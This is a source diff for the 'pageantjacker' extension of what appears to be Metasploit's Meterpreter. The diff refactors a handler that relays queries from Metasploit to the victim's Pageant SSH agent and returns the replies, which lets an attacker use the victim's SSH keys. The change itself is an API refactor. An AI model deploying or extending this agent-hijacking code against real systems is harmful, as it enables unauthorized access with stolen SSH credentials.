@@ -3,6 +3,7 @@
  * @brief Entry point and intialisation functionality for the pageantjacker extention.
  */
 #include "extapi.h"
+#include "common_metapi.h"
 #include "pageantjacker.h"
 
 #include <stdio.h>
@@ -173,14 +174,14 @@ out:
 
 DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD rawDataSizeIn = 0;
-	Byte *rawDataIn = NULL;
+	byte *rawDataIn = NULL;
 	PAGEANTQUERYRESULTS results = { 0 };
 
 	// Retrieve from metasploit
-	rawDataSizeIn = packet_get_tlv_value_uint(packet, TLV_TYPE_EXT_PAGEANT_SIZE_IN);
-	rawDataIn = packet_get_tlv_value_raw(packet, TLV_TYPE_EXT_PAGEANT_BLOB_IN);
+	rawDataSizeIn = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_EXT_PAGEANT_SIZE_IN);
+	rawDataIn = met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_EXT_PAGEANT_BLOB_IN);
 
 	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", rawDataSizeIn, rawDataIn);
 
@@ -194,9 +195,9 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 	send_query_to_pageant(rawDataIn, rawDataSizeIn, (PAGEANTQUERYRESULTS *) &results);
 
 	// Build the packet based on the respones from the Pageant interaction.
-	packet_add_tlv_bool(response, TLV_TYPE_EXT_PAGEANT_STATUS, results.result);
-	packet_add_tlv_raw(response, TLV_TYPE_EXT_PAGEANT_RETURNEDBLOB, results.blob, results.bloblength);
-	packet_add_tlv_uint(response, TLV_TYPE_EXT_PAGEANT_ERRORMESSAGE, results.errorMessage);
+	met_api->packet.add_tlv_bool(response, TLV_TYPE_EXT_PAGEANT_STATUS, results.result);
+	met_api->packet.add_tlv_raw(response, TLV_TYPE_EXT_PAGEANT_RETURNEDBLOB, results.blob, results.bloblength);
+	met_api->packet.add_tlv_uint(response, TLV_TYPE_EXT_PAGEANT_ERRORMESSAGE, results.errorMessage);
 	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len "
 		"%d, data is at 0x%p. Error message at 0x%p (%d)",
 		results.result, results.bloblength, results.blob,
@@ -205,7 +206,7 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 	free(results.blob);
 
 	// Transmit the packet to metasploit
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	return ERROR_SUCCESS;
 }
